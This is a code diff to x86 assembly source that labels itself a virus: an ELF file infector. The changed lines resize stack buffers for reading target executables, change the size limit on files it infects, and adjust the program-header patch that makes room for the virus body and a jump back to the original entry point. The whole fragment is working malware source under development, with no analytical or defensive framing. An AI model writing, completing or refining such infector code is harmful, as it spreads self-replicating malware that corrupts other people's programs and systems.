@@ -4,11 +4,11 @@ section .text
 v_start:
     ; virus start
 
-    mov ecx, 2328
-    ; 2080-2328     elf_targets' content space
-    ; 1056-2080     elf_targets space
-    ; 32-1056       all stuff space
-    ; 0-32          buffer(all of the unsure targets' name)
+    mov ecx, 9248
+    ; 2080-9248     7kb, elf_targets' content space
+    ; 1056-2080     1kb, elf_targets space
+    ; 32-1056       1kb, all stuff space
+    ; 0-32          32bytes, buffer(all of the unsure targets' name)
     
 fake_space:         ; create fake space in stack
     push 0x00
@@ -178,7 +178,7 @@ read_content:
     je eof
 
     mov eax, edi
-    add eax, 9312           ; 2080 + 7232
+    add eax, 9248           ; 2080 + 7168
     cmp ecx, eax            ; quit if the file is over 7232 bytes 
     jge start_infect
 
@@ -235,9 +235,7 @@ program_header_loop:
     
     ; change file size
     add edx, v_stop - v_start           
-    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
     add edx, 7                          ; edx =  p_filesz + size of virus + 7(for the jmp to original entry point)
-    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
     mov [edi+2080+eax+16], edx          ; overwrite the old p_filesz
 
     ; resize in bytes of the segment in memory
